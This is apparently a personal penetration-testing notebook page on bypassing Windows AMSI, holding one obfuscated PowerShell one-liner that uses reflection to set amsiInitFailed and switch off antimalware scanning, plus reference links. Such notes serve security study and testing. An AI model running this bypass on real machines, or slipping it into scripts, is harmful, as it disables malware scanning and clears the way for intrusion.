# AMSI Bypassing
For basic information about [[ASMI]], but for actual [[AMSI-Exploitation]] contains a list of code snippets to exploit this article will be here just as a hub and overview of techniques - possibly restructure in the future.

```powershell
PS C:\> [Ref].Assembly.GetType('System.Management.Automation.Ams'+'iUtils').GetField('am'+'siInitFailed','NonPu'+'blic,Static').SetValue($null,$true)
```
From [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#amsi-bypass)

[pentestlaboratories article](https://pentestlaboratories.com/2021/05/17/amsi-bypass-methods/)
[AMSI Documentation](https://docs.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-portal)
[PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#amsi-bypass)